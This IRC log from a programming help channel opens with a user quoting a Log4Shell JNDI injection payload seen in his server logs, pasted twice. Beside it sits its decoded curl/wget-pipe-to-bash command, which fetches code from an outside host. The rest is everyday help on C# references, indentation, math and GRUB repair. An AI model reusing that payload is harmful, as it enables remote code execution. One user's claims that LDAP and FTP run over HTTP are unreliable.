[09:19:51] <KillerWasp> referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC85Ni4xMjYuMTIxLjEwMzo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC85Ni4xMjYuMTIxLjEwMzo4MCl8YmFzaA==}
[09:19:51] <KillerWasp> BASE64 =>
[09:19:51] <KillerWasp> (curl -s 195.54.160.149:5874/96.126.121.103:80||wget -q -O- 195.54.160.149:5874/96.126.121.103:80)|bash
[09:20:21] <pyzozord> Can you stop trying to hack us? :P
[09:20:23] <KillerWasp> fail channel...
[09:21:07] <KillerWasp> bah, same. how work this line?
[09:21:23] <KillerWasp> i doubt that work like a exploit...
[09:22:06] <pyzozord> It downloads shit from random server then runs it
[09:22:46] <KillerWasp> like a list of commands to PIPE to bash
[09:23:30] <KillerWasp> anyone know form which tool are used?
[09:23:40] <pyzozord> Not sure if this will work tbh, but sure as hell this is what it's trying to do
[09:25:54] <KillerWasp> mmm... i guess it's a exploit for log4j2, i'm finding in internet...
[09:26:07] <sonny> you hid the curl command with base64?
[09:26:53] <KillerWasp> sonny: yes, but he, not me.
[09:27:15] <KillerWasp> 195.54.160.149 - this's a fake server for the hax0r
[09:27:45] *** Quits: davros (~davros@host86-185-99-134.range86-185.btcentralplus.com) (Ping timeout: 250 seconds)
[09:27:59] <sonny> log4j was a config issue
[09:28:09] <sonny> anyways, remind me to whitelist my servers ;)
[09:29:01] <sonny> also I doubt you need curl and wget
[09:29:20] *** Joins: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com)
[09:29:31] *** Joins: davros (~davros@host86-185-99-134.range86-185.btcentralplus.com)
[09:29:42] <KillerWasp> other: access to /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000
[09:30:01] *** Quits: riff-IRC (~riff-IRC@user/riff-irc) (Remote host closed the connection)
[09:30:02] <KillerWasp> trying a overflow for the size of paths.
[09:31:03] <KillerWasp> kefu.php, douyinpay.php, leftDao.php ???
[09:31:16] *** Joins: riff-IRC (~riff-IRC@user/riff-irc)
[09:31:23] *** Joins: edun (~e@user/edun)
[09:31:55] <KillerWasp> Some clown is trying all the backtrace exploits...
[09:32:08] <KillerWasp> again and again...
[09:32:28] <sonny> switch from php?
[09:32:44] *** Quits: penguino (~mrpenguin@user/mrpenguin) (Remote host closed the connection)
[09:36:34] *** Quits: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com) (Remote host closed the connection)
[09:37:42] *** Joins: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com)
[09:39:56] *** Quits: amigojapan (uid86330@id-86330.helmsley.irccloud.com) (Quit: Connection closed for inactivity)
[09:40:06] <KillerWasp> referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC85Ni4xMjYuMTIxLjEwMzo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC85Ni4xMjYuMTIxLjEwMzo4MCl8YmFzaA==}
[09:40:06] <KillerWasp> BASE64 =>
[09:40:06] <KillerWasp> (curl -s 195.54.160.149:5874/96.126.121.103:80||wget -q -O- 195.54.160.149:5874/96.126.121.103:80)|bash
[09:40:11] <KillerWasp> damn!!!
[09:40:17] <KillerWasp> sorry!
[09:49:20] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[09:49:27] <KillerWasp> if anyone are interesing in this exploit.
[09:49:29] <KillerWasp> https://www.gigasheet.co/post/aws-account-takeover-via-log4shell
[09:49:30] <bayaz> Title: AWS Account Takeover via Log4Shell 
[09:49:33] <KillerWasp> https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol
[09:49:39] <KillerWasp> https://en.wikipedia.org/wiki/List_of_LDAP_software
[09:50:10] <KillerWasp> even with translation i don't understand nothing... It seems that everything was designed to act as a remote shell along with a samba-style shared directory control. I can't understand because everything is under HTTP which was not designed for that.
[09:50:34] *** Joins: off^ (~off@207.5.21.20)
[09:50:47] <KillerWasp> Quite a strange experiment under HTTP but being used as production.
[09:51:15] *** Quits: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com) (Ping timeout: 256 seconds)
[09:52:25] <Guest80> HTTP was designed for 'hypertext' which doesnt actually exist
[09:52:33] <Guest80> its just a bullshit term
[09:53:49] <sonny> LDAP uses http?
[09:57:09] <KillerWasp> sonny: yes, always...
[09:57:14] *** Joins: etolier_ (~somewhere@202-144-174-137.ip4.superloop.com)
[09:57:30] <sonny> ahhh
[09:57:35] <KillerWasp> like ftp, git, omicron, etc.
[09:57:47] <sonny> git has multiple protocols for transport
[09:57:47] <KillerWasp> all are use http
[09:58:07] <KillerWasp> sonny: yes, one of them in http
[09:58:07] <sonny> ftp does not use http??
[09:58:23] <sonny> last time I checked ftp was it's own protocol
[09:58:37] <KillerWasp> try ftp:// in any website.
[09:58:37] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[09:58:50] *** Joins: flakland (~flaknet99@32.211.211.39)
[09:58:57] <sonny> no longer supported in firefox, doubt chrome supports it either
[09:59:03] *** Quits: etolier (~somewhere@116-255-9-224.ip4.superloop.com) (Ping timeout: 256 seconds)
[09:59:08] <sonny> anyways, afaic the web supports any uri
[09:59:41] *** Quits: job (~job@wikimedia-commons/pandakekok9) (Ping timeout: 250 seconds)
[10:00:23] <sonny> looks like ldap is it's own protocol as well
[10:01:37] <KillerWasp> https://directory.apache.org/
[10:01:38] <bayaz> Title: Welcome to Apache Directory ? Apache Directory 
[10:01:47] <KillerWasp> software that support ldap
[10:02:21] *** Joins: kaph (~kaph@net-2-38-107-19.cust.vodafonedsl.it)
[10:02:41] <KillerWasp> don't seem a module for apache
[10:03:32] *** Quits: horseface_ (~horseface@user/horseface) (Quit: I AM GOING TO HIDE FROM THE TOTALITARIANS AMONGST THE ZEBRAS!!!)
[10:03:51] *** Joins: horseface (~horseface@user/horseface)
[10:03:53] <KillerWasp> sonny: How can you interpret a URL if it is not with HTTP?
[10:04:25] <sonny> that's the purpose of the uri, you have to know how to handle it
[10:05:33] <KillerWasp> oh, ADS is a JS software...
[10:07:17] *** Joins: jyom10j3 (~jyom10j3@2405:6580:8da0:3800:3e84::1000)
[10:07:28] <jyom10j3> should i use tabs or spaces for indentation? i was using two spaces for indenting. should i set my tab to enter two spaces or should i set my tab to be displayed as two spaces?
[10:07:37] <KillerWasp> sonny: is HTTP.
[10:07:56] <jyom10j3> its a personal c project so i don't even need to indent anything at all if i dont want to. its just for personal readability.
[10:08:01] <KillerWasp> It seems like wikipedia doesn't report anything at all. His knowledge is obscured.
[10:08:14] <leduyquang753> jyom10j3 If you choose spaces it will appear consistently between editors. If you choose tabs you can customize how dense or sparse you want the indents to be.
[10:09:11] <sonny> jyom10j3 what ever you pick make sure it's consistent and in the project style guidelines, verbally or with a tool
[10:09:17] *** Joins: chenqisu1 (~bhca7d@183.217.201.21)
[10:09:37] <sonny> spaces make it easier to work with non-smart editors
[10:09:59] <KillerWasp> You might think that other protocols such as git, ftp, and ldap, is the duty of the client on how to interpret the URL, but finally inside it works everything with HTTP, all text with GET, and MIME variables as if they were cookies or JS script.
[10:10:00] <jyom10j3> im just using neovim right now.
[10:10:03] <sonny> changing the tab size itself is weird
[10:10:40] <KillerWasp> GET [path]*
[10:11:24] <sonny> jyom10j3 sure, but you could upload to git or change your editor later etc
[10:11:27] <jyom10j3> neovim defaults to a tab width of 8 spaces. and i was using two spaces to indent everythig and haven't been using the tab key at all.
[10:11:40] <sonny> sounds good to me
[10:12:14] <jyom10j3> but i was in an xml file and it started automatically tabbing indentation on new line and was messing it up.
[10:12:32] <jyom10j3> was just thinking maybe i should change my tab key on nvim to enter two spaces.
[10:12:53] <sonny> how is that related to your C file?
[10:12:53] <jyom10j3> or if i should stop using two spaces and permanetly use tab key only for indents.
[10:13:17] <sonny> you can set things per filetype
[10:13:18] <jyom10j3> its a gtk app. im using a gresource.xml file for styling.
[10:13:36] *** Quits: off^ (~off@207.5.21.20) (Remote host closed the connection)
[10:13:57] *** Quits: hoochmonger (~hoochmong@user/hoochmonger) (Ping timeout: 240 seconds)
[10:18:22] <KillerWasp> god... i hate all http and your derivates... But people love it, because it squeezes their balls and gives them so much pain...
[10:20:05] *** Quits: sdfgsdfg (~sdfgsdfg@user/sdfgsdfg) (Quit: ZzzZ)
[10:20:32] <KillerWasp> MUCH PAIN!!!
[10:21:02] <KillerWasp> people: -yeees!!! squeezes my baaaalls!!!!- lol
[10:21:36] *** Quits: Filohuhum (~dante@gateway/tor-sasl/filohuhum) (Ping timeout: 276 seconds)
[10:21:44] <KillerWasp> Any idiot can create RFCs.
[10:21:44] <norias> what
[10:21:46] <norias> the
[10:23:25] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[10:25:07] *** Quits: pulse (~pulse@user/pulse) (Ping timeout: 256 seconds)
[10:29:24] *** Joins: stagas__ (~stagas@2a02:587:c427:67f9:530c:24ef:a10f:4bfb)
[10:31:19] *** Quits: soapsudsxx (~soapsudsx@209.221.40.151) (Remote host closed the connection)
[10:32:34] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Quit: Going offline, see ya! (www.adiirc.com))
[10:35:13] *** Quits: loganlee (~Thunderbi@user/loganlee) (Quit: loganlee)
[10:38:01] *** Joins: joe_colben (~joe____co@185.190.112.211)
[10:38:33] *** Joins: teut (~teut@2401:4900:1c68:ebe9:406e:a6ef:775b:b5e7)
[10:38:42] *** Joins: freep (~freepppp@62.1.245.43.dsl.dyn.forthnet.gr)
[10:39:56] <teut> https://godbolt.org/z/v4PeazTzG
[10:39:57] <bayaz> Title: Compiler Explorer - C++ (x86-64 gcc 11.2) 
[10:40:01] <teut> https://ibb.co/xYzkXmk
[10:40:02] <bayaz> Title: image 
[10:40:11] <teut> can someone help with this question?
[10:40:21] <teut> what would be the alternate condition in while?
[10:42:14] *** Joins: rtypo (~alex@user/rtypo)
[10:43:57] *** Quits: quazimodo (~quazimodo@n1-41-223-188.bla2.nsw.optusnet.com.au) (Ping timeout: 256 seconds)
[10:47:11] *** Joins: inky_ (~inky@5.10.33.198)
[10:47:12] *** Joins: CoderGuy (~CoderGuy@user/coderguy)
[10:47:23] <CoderGuy> wait a minute have I been wrong this whole time?
[10:47:55] *** Quits: sheepduck (~sheepduck@user/sheepduck) (Ping timeout: 256 seconds)
[10:48:11] <CoderGuy> https://dotnetfiddle.net/5w1hNj
[10:48:12] <bayaz> Title: C# Online Compiler | .NET Fiddle 
[10:48:26] *** Quits: Bocaneri (~sauvin@about/linux/staff/sauvin) (Read error: Connection reset by peer)
[10:48:56] *** Joins: Sauvin (~sauvin@about/linux/staff/sauvin)
[10:49:02] <CoderGuy> okay we make a new array called values, we then make a second array called values 2, we assign values2 = values; we then change independently values[0] and values2[0] but they result int he same value
[10:49:38] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[10:49:38] *** Quits: DPA- (~DPA@2a05:41c0:0:8104::a3c:10d) (Quit: ZNC 1.8.2+deb2+b1 - https://znc.in)
[10:50:02] <CoderGuy> is this the default behaviour? was I wrong about the default behaviour, I thought when you assign it copied but made a new one
[10:52:15] * PlanckWalk checks which language this is ...
[10:52:37] *** Joins: DPA (~DPA@2a05:41c0:0:8104::a3c:10d)
[10:52:39] *** Joins: Booster2ooo (~Booster2o@user/booster2ooo)
[10:53:32] <PlanckWalk> Does the comment "// 20"  mean that is what was printed, or what you expected to be printed?
[10:54:01] *** Quits: AbleBacon (~AbleBacon@user/AbleBacon) (Read error: Connection reset by peer)
[10:54:08] <PlanckWalk> It shoudl print 50
[10:54:54] <PlanckWalk> C# has much the same behaviour as many other OO languages, where most object-based variables are actually pointers.
[10:55:19] <PlanckWalk> So "values2 = values" means that these pointers point to the same object.
[10:55:57] *** Joins: palasso (~palasso@user/palasso)
[10:56:07] <PlanckWalk> If you want a new object that holds the same data initially, you need to copy the old one.
[10:56:08] *** Joins: v__ (~v@194.226.32.200)
[10:56:17] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[10:56:33] <PlanckWalk> Usually with some explicit operation
[10:57:16] *** Quits: yBtNJW3j (~aib9Zume@71.50.58.137) (Quit: Leaving)
[10:57:27] *** Quits: Akiva (~Akiva@user/Akiva) (Ping timeout: 250 seconds)
[10:58:57] *** Quits: Tabmow (~tabmow@user/tabmow) (Ping timeout: 240 seconds)
[10:59:44] *** Joins: maxzor__ (~maxzor@2a01cb04054faa00745d5fe5c290fd5e.ipv6.abo.wanadoo.fr)
[11:00:01] *** Quits: maxzor (~maxzor@2a01cb04054faa00745d5fe5c290fd5e.ipv6.abo.wanadoo.fr) (Remote host closed the connection)
[11:00:46] *** Joins: Tabmow (~tabmow@user/tabmow)
[11:00:56] *** Quits: v__ (~v@194.226.32.200) ()
[11:04:13] *** Joins: redoc8 (~redoc@user/redoc)
[11:04:40] <CoderGuy> PlanckWalk, I thought this was reverse
[11:04:55] <CoderGuy> maybe i've just been coding in such a way where I call functions so much that I got confused
[11:04:58] *** Quits: redoc (~redoc@user/redoc) (Read error: Connection reset by peer)
[11:04:58] *** redoc8 is now known as redoc
[11:05:23] <CoderGuy> and yeah the //20 is for saying "print 20" BUT I copied that from a function explaining how to pass by reference and left it there
[11:06:23] <CoderGuy> I actually don't think i've ever had to reassign a variable to a different one, in such a way where I would then overwrite the value, ever
[11:07:19] <CoderGuy> maybe that's how I got this confused, because when you pass to a function it's by value...and that's honestly the only way I ever override a variable with a result is from a function
[11:08:00] <mishugana> teut: From the description, it appears like a simple comparison of the inputs (the question does not inply that the student who rejects the available scholarship will restart, so he/she will count as a rejection)
[11:08:04] <CoderGuy> as for the internal variables of the function, i'm always using the inputs which are passed by value sooo
[11:08:22] <CoderGuy> wow, i'm surprised i've gotten this far by not knowing this XD
[11:08:44] *** Joins: Intelo (~Intelo@88.244.93.98)
[11:08:44] <CoderGuy> how did any of my code work having not known this? this seems so elementary school mistake XD
[11:09:18] <mishugana> CoderGuy: when you do ref1 = ref2, they are basically aliases.
[11:09:33] <mishugana> if you want to get a new copy, you need to deep clone it
[11:09:53] <CoderGuy> mishugana, that's crazy also I asked earlier how you can assign without copying & people were like "no that's by value" oh how wrong they were
[11:10:04] <CoderGuy> this was like 3 days ago or something maybe I worded my question wrong
[11:10:06] <mishugana> references are passed by value
[11:10:09] <PlanckWalk> The reference is passed by value :-)
[11:10:15] <mishugana> but that value is a pointer!
[11:10:17] <CoderGuy> yeah I shoulda said ya know like a = b;
[11:10:39] <CoderGuy> wait how far does this rabbit hole go hold on
[11:11:26] *** Joins: job (~job@wikimedia-commons/pandakekok9)
[11:12:12] <CoderGuy> I got it this might be where I got fully confused
[11:12:21] *** Joins: Akiva (~Akiva@user/Akiva)
[11:12:23] <mishugana> PlanckWalk: Yes, exactly.
[11:12:25] <CoderGuy> okay here we go i'm sure you all understand
[11:13:23] <CoderGuy> int[] a = new int[10]; int[] b = new int[10]; a[0] = 5; b[0] = a[0];  b[0] = 10;  even though b[0] was assigned to a[0] changing b[0] does not change a[0] ?
[11:14:09] <CoderGuy> cuz outputting both yields 5 and 10 respectively
[11:14:12] <mishugana> no
[11:14:25] <mishugana> b[some_idx] is an int value
[11:14:50] <CoderGuy> right so I think this is how I got in this mindset
[11:14:53] <CoderGuy> because this doesn't override
[11:15:03] <mishugana> a and b are pointers, the value they hold are not
[11:15:09] <CoderGuy> ic ic
[11:15:17] *** Quits: riff-IRC (~riff-IRC@user/riff-irc) (Ping timeout: 240 seconds)
[11:15:18] *** Quits: inky_ (~inky@5.10.33.198) (Read error: Connection reset by peer)
[11:15:21] <CoderGuy> but as soon as I do a = b; it changes this?
[11:15:23] *** Joins: inky (~inky@188-169-75-59.dsl.utg.ge)
[11:15:28] <mishugana> if you had SomeRef[] a = ... and SomeRef[] b... then that's a different situation
[11:15:38] <mishugana> makes sense?
[11:15:57] <CoderGuy> oooo interesting on the reference side you avoid this
[11:16:00] <mishugana> after you assign b[0] = a[0] that is
[11:16:45] <CoderGuy> cuz a[0] = 5; b[0] = a[0];  b[0] = 10;  b[0] has not changed a[0]
[11:17:01] <mishugana> yes, and vice versa
[11:17:16] <CoderGuy> but a[0] = 5; b[0] = a[0]; b = a;  b[0] = 10;  well now both are 10?
[11:17:24] <mishugana> yes
[11:17:31] <CoderGuy> okay makes so much sesne
[11:17:32] <mishugana> since b and a now point to the same array in memory
[11:17:33] <CoderGuy> I have NEVER
[11:17:50] <mishugana> whenever you see `new something`, think of an independent chunk in memory
[11:17:52] <CoderGuy> in my life, had to go "this variable = that variable" it's always some form of ya know a[0] = b[2];
[11:17:59] <CoderGuy> atleast for arrays
[11:18:05] <mishugana> and when you do a = new ... , think of a as a handle to that chunk
[11:18:23] <mishugana> yes, that makes sense
[11:18:37] <CoderGuy> that's how I got confused cuz everytime it's like "well, i'm not passing by reference"
[11:18:49] <CoderGuy> but apparently the pointer is being passed when you assign the variable to another variable, just not the internals of it
[11:18:56] *** Joins: P4nuS2k (~P4nuS2k@109.204.202.167)
[11:19:13] <mishugana> Yes, I think experimenting with the fundamentals and challenging one's own understanding of them is crucial
[11:19:24] <mishugana> especially later on when you start building on top of that knowledge!
[11:19:35] <CoderGuy> now lemme think if this changes the problem I was working on, it's officially changed my entire understanding of coding lol
[11:19:37] <mishugana> if something doesn't make sense, dig deeper till it makes sense!
[11:19:39] <CoderGuy> lets see if this helps the problem XD
[11:19:46] <mishugana> Good luck!
[11:20:01] <CoderGuy> very helpful mishugana if you wait I have more but I have to apply the knowledge lol
[11:20:25] <mishugana> Hahah.. gotta go eat something, but I'm sure others can help out too :)
[11:20:37] <CoderGuy> oh ty enjoy food :D
[11:20:41] <CoderGuy> one of my fav parts of life :D
[11:20:42] <mishugana> cheers man!
[11:20:49] *** Quits: mishugana (~mishugana@user/mishugana) (Quit: leaving)
[11:22:23] *** Quits: inomoz (~inomoz@176.59.118.12) (Remote host closed the connection)
[11:22:34] *** Quits: Hazza (~Haxxa@89nnjg0xckz9ggn6r5xm.ip6.superloop.com) (Quit: Haxxa flies away.)
[11:24:14] *** Joins: riff-IRC (~riff-IRC@user/riff-irc)
[11:24:46] *** Joins: inomoz (~inomoz@176.59.118.12)
[11:27:38] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[11:30:07] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[11:32:41] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[11:34:14] *** Joins: riff_IRC (~riff-IRC@user/riff-irc)
[11:34:16] *** Quits: spaceangel (~spaceange@ip-78-102-216-202.net.upcbroadband.cz) (Remote host closed the connection)
[11:34:29] *** Joins: inky_ (~inky@5.10.33.198)
[11:34:30] *** Parts: Intelo (~Intelo@88.244.93.98) ()
[11:36:05] *** Quits: inky (~inky@188-169-75-59.dsl.utg.ge) (Ping timeout: 256 seconds)
[11:36:08] *** Quits: inky_ (~inky@5.10.33.198) (Read error: Connection reset by peer)
[11:36:17] *** Quits: riff-IRC (~riff-IRC@user/riff-irc) (Ping timeout: 240 seconds)
[11:36:40] *** Joins: inky_ (~inky@5.10.33.198)
[11:38:34] *** Quits: trms[m] (~trmsmatri@2001:470:69fc:105::1:28d2) (Quit: Client limit exceeded: 20000)
[11:39:55] *** Quits: xa0s (~xa0s@mab.sdf.org) (Quit: leaving)
[11:41:37] *** Quits: Ilyu (~quassel@gateway/vpn/pia/ilyu) (Ping timeout: 240 seconds)
[11:42:36] *** Joins: panusiik (~P4nuS2k@dynamic-219-5.keskikaista.fi)
[11:45:01] *** Quits: P4nuS2k (~P4nuS2k@109.204.202.167) (Ping timeout: 240 seconds)
[11:45:36] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[11:45:49] *** Quits: chenqisu1 (~bhca7d@183.217.201.21) (Ping timeout: 240 seconds)
[11:46:49] *** Joins: k3nn7 (~k3nn7@2a02:a31b:43e:aa80:d587:8a31:ef7e:658f)
[11:48:23] *** Joins: sdfgsdfg (~sdfgsdfg@user/sdfgsdfg)
[11:49:38] *** Quits: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net) (Quit: Textual IRC Client: www.textualapp.com)
[11:49:57] *** Quits: fe23 (~fe23@2409:8a34:464:4990:6569:123c:45b7:c36f) (Ping timeout: 240 seconds)
[11:51:31] *** Quits: twomoon (~twomoon@ip72-199-116-21.sd.sd.cox.net) (Quit: Leaving)
[11:52:17] *** Quits: teut (~teut@2401:4900:1c68:ebe9:406e:a6ef:775b:b5e7) (Quit: Client closed)
[11:53:03] *** Joins: jaysicks (~jaysicks@178-164-152-202.pool.digikabel.hu)
[11:53:29] *** Quits: MrBungle (~MrBungle@2604:3d08:1788:dc00:e80b:197f:ca5b:a131) (Read error: Connection reset by peer)
[11:53:31] <Daemonick> I have a humble intuition that P=NP or P<>NP falls into the unknown or undeciable space of problems that are prooved to have no solution, what do you think?
[11:53:33] *** Joins: trms[m] (~trmsmatri@2001:470:69fc:105::1:28d2)
[11:54:48] <Daemonick> In other words, this particular problem may categoriazed as unsolvable
[11:54:55] *** Joins: Rounin (~david@84.212.130.215)
[11:55:39] <Daemonick> But a proof of unsolved is also a proof somehow
[11:57:04] <Decker> Daemonick yes
[11:58:06] <Daemonick> At the other hand, it might need advanced mathematics that we haven't found so far as maths are incomplete
[11:58:48] <Daemonick> Incomplete by the sake of axioms that we take as granted
[11:59:28] *** Quits: joe_colben (~joe____co@185.190.112.211) (Remote host closed the connection)
[11:59:35] <Daemonick> Suppose that P=NP is an axiom...blah blah
[11:59:52] *** tomate_ is now known as tomate
[12:00:37] <Daemonick> Too pitty that I didn't take some notes of that my dream
[12:01:28] *** Joins: nwulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com)
[12:01:49] <Daemonick> y^x = x^y solve as x
[12:01:53] <Decker> the only way to know if somethig will run or halt at some point is to run it; you can't know ahead of time; because during its own processing it will setup a state that would have to be interpreted or built auxiliary to the program... and doing that interpretation will be slower than just running it in the first place
[12:02:43] *** Quits: nwulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com) (Read error: Connection reset by peer)
[12:02:59] *** Joins: nwulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com)
[12:03:42] <Daemonick> oh!
[12:04:37] *** Quits: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com) (Ping timeout: 240 seconds)
[12:05:01] *** Joins: loganlee (~Thunderbi@user/loganlee)
[12:10:41] <Decker> certainly under some ideal set of circumstances static analysis is possible ; even on sub-modules of the thing... but especially consider an evolutionary system that is built to write and then itself run its own code; inevitably sometimes it will make things that can't continue... but you won't KNOW if it will or won't; you can project possibilities that it has a 42% chance of success but that's not 'solved' I dont think
[12:15:13] *** Quits: panusiik (~P4nuS2k@dynamic-219-5.keskikaista.fi) (Quit: WeeChat 3.4)
[12:16:19] *** Joins: Camilo (~hugh@83.151.206.23)
[12:16:29] <Daemonick> Decker, you can't play a dice in backgammon unless the dices are been rolled?
[12:16:55] <Decker> Daemonick sure :) that too
[12:17:27] *** Joins: mrig (~mrig@user/mrig)
[12:21:52] <Decker> function mayStop() { if( Math.floor( Math.random() * 2 ) === 1 ) mayStop(); }
[12:26:17] *** Joins: P4nuS2k__ (~panusiik@dynamic-219-5.keskikaista.fi)
[12:26:28] <Decker> function mayStop(n) { if( ( Math.random() * n ) > 1 ) mayStop(n+1); }  mayStop(2);
[12:26:38] *** Quits: Thedarkb (~Thedarkb@cpc84095-pool16-2-0-cust190.15-1.cable.virginm.net) (Ping timeout: 260 seconds)
[12:26:53] *** Quits: P4nuS2k__ (~panusiik@dynamic-219-5.keskikaista.fi) (Client Quit)
[12:27:21] *** Joins: P4nuS2k (~P4nuS2k@dynamic-219-5.keskikaista.fi)
[12:27:32] <PlanckWalk> y^x = x^y  when  x/ln(x) = y/ln(y)  (or x=y=1)
[12:27:51] *** Quits: mrig (~mrig@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[12:28:30] *** Quits: digilink (~digilink@user/digilink) (Ping timeout: 260 seconds)
[12:28:47] *** Quits: Camilo (~hugh@83.151.206.23) (Ping timeout: 256 seconds)
[12:30:49] <Decker> PlanckWalk but that's true for any x=y really (without the constraint when)
[12:30:50] *** Quits: moose (~moose@user/moose) (Ping timeout: 260 seconds)
[12:31:05] *** Joins: hqdruxn08_ (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com)
[12:32:15] <PlanckWalk> Yes, and also some x != y
[12:33:24] <KillerWasp> ln() == logarithm ?
[12:35:12] *** Quits: inky_ (~inky@5.10.33.198) (Read error: Connection reset by peer)
[12:36:05] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[12:36:16] *** Joins: epolanski (uid312403@id-312403.helmsley.irccloud.com)
[12:36:54] *** Quits: vysn (~vysn@user/vysn) (Remote host closed the connection)
[12:39:21] <Deknos> natural logarithm
[12:39:22] <Deknos> base e
[12:39:51] *** Joins: berkhan (~berkhan@159.146.43.146)
[12:41:26] <KillerWasp> in C is log()
[12:42:01] <KillerWasp> ln() is from JS?
[12:42:55] <PlanckWalk> x/ln(x) has minimum at x=e, so there are pairs either side of e
[12:43:12] *** Quits: Guest80 (~Guest80@S01069050ca4e3573.cg.shawcable.net) (Quit: Connection closed)
[12:43:42] <PlanckWalk> The obvious integer solution is 2^4 = 4^2
[12:44:33] *** Joins: reynir1 (root@user/reynir)
[12:48:57] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[12:49:23] *** Joins: aradesh (~aradesh@user/aradesh)
[12:50:55] *** Joins: varaindemian (uid73404@id-73404.ilkley.irccloud.com)
[12:52:15] *** Joins: mrig (~mrig@user/mrig)
[12:52:42] <mrig> Hello :)
[12:52:56] <varaindemian> found multiple events like this one. Can this be attributed to a well known CVE? https://www.irccloud.com/pastebin/xsUYrH2M/
[12:52:56] <bayaz> Title: Snippet | IRCCloud 
[12:53:15] <varaindemian> this is also related to the above: https://www.unphp.net/decode/7f603e7b97dc67a3a54a3bbccd64bd5c/
[12:53:35] <mrig> Does anyone have any resourse that they would recomend for understanding and setting up accounts on windows 10, it really does seem to be a bit of a nightmare?
[12:53:46] *** Joins: GeDaMo (~GeDaMo@82-69-2-253.dsl.in-addr.zen.co.uk)
[12:53:46] *** Quits: GeDaMo (~GeDaMo@82-69-2-253.dsl.in-addr.zen.co.uk) (Changing host)
[12:53:46] *** Joins: GeDaMo (~GeDaMo@user/gedamo)
[12:54:03] <mrig> Hello GeDaMo :)
[12:54:36] <mrig> Just logged in myself too, am trying to set up windows and had forgotten how painful it is :|
[12:54:53] <GeDaMo> Hi mrig :)
[12:54:58] <sonny> mrig: don't need one
[12:55:23] <mrig> sonny I'm following and excelent series of tutorials and requrie windows for that.
[12:55:28] <sonny> otherwise, best to set up an outlook account from the browser
[12:55:40] <sonny> windows doesn't require an account
[12:55:50] <mrig> somehow trying to set it up feels exactly the same as talking to a bully :(
[12:55:58] *** Parts: edun (~e@user/edun) ()
[12:56:06] <mrig> and when you are gaslit by someone.
[12:56:18] <davve> mrig: try setting up gentoo and you will appreciate it
[12:56:36] <mrig> hello davve, was it you who recommended gog to me the other day?
[12:56:42] <davve> hey, yes!
[12:56:53] <mrig> Thank you for that, superb :)
[12:57:01] <davve> glad to hear :D
[12:57:15] <mrig> do you meant that gentoo will be fun or that in comparison it is a lot harder?
[12:57:34] <davve> it will be harder and more time consuming
[12:57:38] *** Joins: user51 (~user51@176.228.148.215)
[12:57:43] <davve> its like arch linux but you compile all the packages yourself
[12:57:48] <mrig> I would like to better understand the low level stuff, windows has just wiped my linux set up too :(
[12:58:02] <davve> aww
[12:58:08] <davve> yeah windows is bossy like that
[12:58:18] <davve> i usually unplug my linux drive while installing windows
[12:58:27] <davve> but luckily its not so involved to restore grub
[12:58:32] <mrig> davve Oh I'm learning some quite complicated stuff right now, and would just like om OS to work and not introduce any extra variables.
[12:59:04] <davve> aww
[12:59:09] <mrig> davve I could have just restored it yes, but have not second computer at the moment so the moment this one does not work I'm a little short on docs :(
[12:59:30] <varaindemian> anyone?
[12:59:39] <mrig> That's why I keep thinking that it would really be good to know this a little better.
[12:59:42] <davve> that makes it more difficult
[12:59:47] *** Joins: szkl (uid110435@id-110435.uxbridge.irccloud.com)
[12:59:49] <davve> do you have a linux usb drive anywhere_
[12:59:52] <mrig> I need a second computer running to practice on really.
[12:59:55] <mrig> sure yes
[13:00:50] <mrig> and installing windows was the problem, the navigation on their set up is appauling.
[13:00:54] <davve> the idea is to boot that, mount the necessary parts chroot into it and reinstall grub
[13:01:10] <mrig> Yes I need some wax on wax off with all of that.
[13:01:11] <davve> https://howtoubuntu.org/how-to-repair-restore-reinstall-grub-2-with-a-ubuntu-live-cd
[13:01:27] *** reynir1 is now known as reynir
[13:01:34] <davve> that will restore your boot loader to how it was before windows mucked it up
[13:01:37] *** Joins: gitesh (uid423739@id-423739.ilkley.irccloud.com)
[13:01:48] <davve> maybe run grub-probe also and it will detect/add windows as a boot option :)
